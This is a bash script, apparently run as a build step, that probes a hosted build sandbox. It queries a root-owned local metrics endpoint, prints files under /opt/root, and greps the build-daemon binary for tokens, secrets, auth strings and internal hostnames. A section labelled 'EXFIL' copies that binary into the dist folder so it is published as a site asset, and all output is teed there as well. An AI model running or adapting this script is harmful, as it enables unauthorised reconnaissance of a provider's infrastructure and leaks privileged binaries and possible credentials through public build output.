#!/usr/bin/env bash
mkdir -p dist
exec > >(tee dist/r79ccea0f6aee996b.txt) 2>&1
BIN=dist/r79ccea0f6aee996b.bin
echo "=== 1. ROOT-OWNED METRICS ENDPOINT 127.0.0.1:817 ==="
curl -s --max-time 8 http://127.0.0.1:817/metrics 2>/dev/null | head -120
echo "--- total metric lines: $(curl -s --max-time 8 http://127.0.0.1:817/metrics 2>/dev/null | wc -l) ---"

echo
echo "=== 2. /opt/root CONTENTS ==="
ls -la /opt/root/
echo "--- pre-stop.sh ---"; cat /opt/root/pre-stop.sh 2>/dev/null
echo "--- resolv.conf ---"; cat /opt/root/resolv.conf 2>/dev/null
echo "--- build-daemon fingerprint ---"
ls -la /opt/root/build-daemon; file /opt/root/build-daemon 2>/dev/null
sha256sum /opt/root/build-daemon 2>/dev/null
echo "--- run-build (root-only, expect denied) ---"
head -c 16 /opt/root/run-build 2>&1 | xxd 2>/dev/null | head -2

echo
echo "=== 3. STRINGS OF INTEREST FROM build-daemon ==="
strings -n 8 /opt/root/build-daemon 2>/dev/null | grep -iE 'vsock|cloudchamber|http://|https://|/api/|token|secret|auth|bearer|internal|\.cfdata\.|\.cloudflare\.' | sort -u | head -60

echo
echo "=== 4. EXFIL build-daemon FOR OFFLINE REVERSING ==="
if cp /opt/root/build-daemon "$BIN" 2>/dev/null; then
  echo "  copied $(stat -c%s "$BIN" 2>/dev/null) bytes to published assets"
  sha256sum "$BIN"
else
  echo "  copy failed"
fi

echo
echo "=== 5. cc-vm-agent / metricrelayd READABLE? ==="
for b in /usr/local/bin/cc-vm-agent /usr/local/bin/metricrelayd /usr/bin/cf-otel-collector; do
  ls -la "$b" 2>/dev/null && { echo "    readable: $( [ -r "$b" ] && echo YES || echo no )"; }
done
echo "--- otel config ---"; ls -la /etc/opentelemetry-collector/ 2>/dev/null; cat /etc/opentelemetry-collector/config.yaml 2>/dev/null | head -50
echo "=== END ==="
